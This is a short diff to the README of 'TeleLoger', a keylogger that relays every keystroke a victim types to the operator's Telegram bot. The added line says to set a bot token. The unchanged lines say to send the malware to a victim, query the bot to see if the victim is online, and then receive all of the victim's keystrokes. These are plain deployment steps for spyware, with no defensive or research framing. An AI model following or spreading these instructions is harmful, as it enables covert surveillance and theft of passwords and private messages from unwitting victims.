@@ -11,6 +11,7 @@ TeleLoger - KeyLoger which send all keys which be pressed in you tg bot
 
 # How to use
 * Read disclaimer
+* Create TGBot and write bot token in var 'API_TOKEN'
 * Send your malware yout victim
 * Write /check to bot to know are online your victim
 * If victim in online, bot will send you all keys pressed your victim
